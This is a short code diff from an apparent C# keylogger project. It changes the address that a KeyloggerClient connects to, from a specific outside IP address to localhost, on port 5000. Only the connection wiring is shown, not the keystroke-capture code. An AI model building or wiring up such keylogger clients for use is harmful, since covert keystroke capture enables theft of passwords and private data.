@@ -12,6 +12,6 @@ class Program
         var keyloggerClient = new KeyloggerClient.KeyloggerClient();
 
         // Connect directly to specified IP and port (change IP as needed)
-        await keyloggerClient.StartAsync(host: "100.113.67.105", port: 5000);
+        await keyloggerClient.StartAsync(host: "localhost", port: 5000);
     }
 }
